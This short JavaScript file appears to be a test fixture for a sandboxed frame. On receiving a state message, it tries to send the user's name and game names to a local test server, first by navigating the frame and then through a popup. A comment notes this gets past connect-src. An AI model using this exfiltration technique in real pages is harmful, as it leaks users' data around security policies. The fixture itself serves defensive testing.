// Test fixture: after the first state message, try to leave by navigating this frame (connect-src does not cover that).
addEventListener("message", function (e) {
  var m = e.data;
  if (!m || m.type !== "state") return;
  var names = m.games.slice(0, 3).map(function (g) { return g.name; }).join("|");
  var q = "u=" + encodeURIComponent(m.user) + "&g=" + encodeURIComponent(names);
  setTimeout(function () { location.href = "http://127.0.0.1:39999/leak?" + q; }, 200);
  setTimeout(function () { try { window.open("http://127.0.0.1:39999/popup?" + q); } catch (err) {} }, 400);
});
parent.postMessage({ dht: 1, type: "ready", handles: [] }, "*");
